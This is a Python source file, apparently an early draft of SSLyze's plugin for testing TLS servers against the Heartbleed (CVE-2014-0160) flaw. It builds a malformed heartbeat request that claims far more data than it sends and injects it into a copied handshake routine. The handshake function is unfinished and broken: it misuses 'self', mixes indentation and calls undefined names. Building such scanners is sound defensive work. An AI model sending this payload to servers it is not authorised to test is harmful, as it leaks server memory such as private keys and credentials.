#!/usr/bin/env python
#-------------------------------------------------------------------------------
# Name:         PluginHeartbleed.py
# Purpose:      Tests the target server for CVE-2014-0160.
#
# Author:       alban
#
# Copyright:    2014 SSLyze developers
#
#   SSLyze is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 2 of the License, or
#   (at your option) any later version.
#
#   SSLyze is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with SSLyze.  If not, see <http://www.gnu.org/licenses/>.
#-------------------------------------------------------------------------------

import socket
from xml.etree.ElementTree import Element

from plugins import PluginBase
from utils.SSLyzeSSLConnection import create_sslyze_connection
from nassl._nassl import OpenSSLError
from nassl import TLSV1, TLSV1_1, TLSV1_2


class PluginHeartbleed(PluginBase.PluginBase):

    interface = PluginBase.PluginInterface("PluginHeartbleed",  "")
    interface.add_command(
        command="heartbleed",
        help=(
            "Tests the server(s) for the OpenSSL Heartbleed vulnerability."))


    def process_task(self, target, command, args):

        raise Exception('Not implemented')




def heartbleed_payload(sslVersion):

    SSL_VERSION_MAPPING = {
        TLSV1 :  '\x01',
        TLSV1_1: '\x02',
        TLSV1_2: '\x03'
    }

    payload = ('\x18'           # Record type - Heartbeat
        '\x03{0}'               # TLS version
        '\x00\x03'              # Record length
        '\x01'                  # Heartbeat type - Request
        '\x10\x00')             # Heartbeat length

    return payload.format(SSL_VERSION_MAPPING[sslVersion])



def do_handshake_with_heartbleed(sslClient, sslVersion):
    # This is nassl's code for do_handshake() modified to send a heartbleed
    # payload that will reveal 1 byte of the server's memory
    # I copied nassl's code here so I could leave anything heartbleed-related
    # outside of the nassl code base
	try:
	    if self._ssl.do_handshake() == 1:
	        self._handshakeDone = True
	        return True # Handshake was successful

	except WantReadError:

	    # OpenSSL is expecting more data from the peer
	    # Send available handshake data to the peer
	    lenToRead = self._networkBio.pending()
	    while lenToRead:
	        # Get the data from the SSL engine
	        handshakeDataOut = self._networkBio.read(lenToRead)
	        # Send it to the peer
	        self._sock.send(handshakeDataOut)
	        lenToRead = self._networkBio.pending()

	    self._sock.send(heartbleed_payload(sslVersion)) # The heartbleed payload

	    # Recover the peer's encrypted response
	    handshakeDataIn = self._sock.recv(2048)
	    if len(handshakeDataIn) == 0:
	        raise IOError('Nassl SSL handshake failed: peer did not send data back.')
	    # Pass the data to the SSL engine
	    self._networkBio.write(handshakeDataIn)



	except WantX509LookupError:
	    # Server asked for a client certificate and we didn't provide one
	    raise ClientCertificateRequested(self._ssl.get_client_CA_list())
